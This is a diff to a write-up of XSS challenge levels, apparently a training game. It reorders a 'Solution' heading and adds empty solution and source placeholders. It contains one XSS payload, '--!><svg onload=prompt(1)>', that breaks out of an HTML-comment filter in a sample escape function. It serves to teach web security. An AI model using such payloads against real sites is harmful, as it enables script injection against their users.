@@ -97,8 +97,6 @@ HTML source
 
 - Task
 
-- Solution
-
 ```
 function escape(input) {
     // filter potential comment end delimiters
@@ -108,6 +106,8 @@ function escape(input) {
     return '<!-- ' + input + ' -->';
 }
 ```
+
+- Solution
 
 ```
 --!><svg onload=prompt(1)>
@@ -219,6 +219,16 @@ function escape(input) {
 }
 ```
 
+- Solution
+
+```
+```
+
+- HTML Source
+
+```
+```
+
 
 ## Level 7
 
@@ -266,6 +276,16 @@ function escape(input) {
     // console.log("' + input + '");        \n\
 </script> ';
 } 
+```
+
+- Solution
+
+```
+```
+
+- HTML Source
+
+```
 ```
 
 
@@ -432,6 +452,16 @@ function escape(input) {
         return 'Invalid image data.';
     }
 }
+```
+
+- Solution
+
+```
+```
+
+- HTML Source
+
+```
 ```
 
 
